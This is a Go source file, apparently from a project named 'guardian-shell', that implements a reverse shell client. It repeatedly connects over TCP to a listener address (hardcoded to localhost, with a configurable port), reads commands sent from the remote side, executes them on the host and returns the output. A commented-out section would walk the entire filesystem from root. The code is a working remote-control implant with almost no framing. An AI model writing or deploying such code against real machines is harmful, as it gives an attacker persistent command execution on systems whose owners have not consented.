package main

import (
	"bufio"
	"fmt"
	"io/fs"
	"log"
	"net"
	"time"

	"github.com/avvvet/guardian-shell/internal/utils"
)

const (
	reverseIP   = "127.0.0.1"
	reversePort = 20090
	retryDelay  = 5
)

func walkResult(path string, d fs.DirEntry, err error) error {
	if err != nil {
		fmt.Println("Error : ", err)
		return nil
	}

	if d.IsDir() {
		fmt.Printf("directory path -> %s, size -> %s \n", path, d.Name())
	}

	return nil
}

func main() {
	port := utils.GetPortFromArgs()

	//list directory
	/*
		root := "/"
		err := filepath.WalkDir(root, walkResult)
		if err != nil {
			fmt.Println("Error:", err)
		}
	*/

	for {

		address := fmt.Sprintf("%s:%d", reverseIP, port)

		conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Printf("Error connecting to the guardian shell listner on port %d. Retrying in %d seconds...\n", port, retryDelay)
			time.Sleep(time.Second * retryDelay)
			continue
		}
		defer conn.Close()

		log.Println("Connected to the reverse guardian listner!")
		fmt.Fprint(conn, utils.PrintWelcomeMessage())

		for {
			command, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				fmt.Println("Error reading command:", err)
				break
			}

			output, err := utils.ExecuteCommands(command)
			if err != nil {
				fmt.Println("Error executing command:", err)
			}
			// log the coming comman
			log.Printf("$ %s", command)

			//send command output to guardian listner
			fmt.Fprint(conn, output)
		}

	}

}
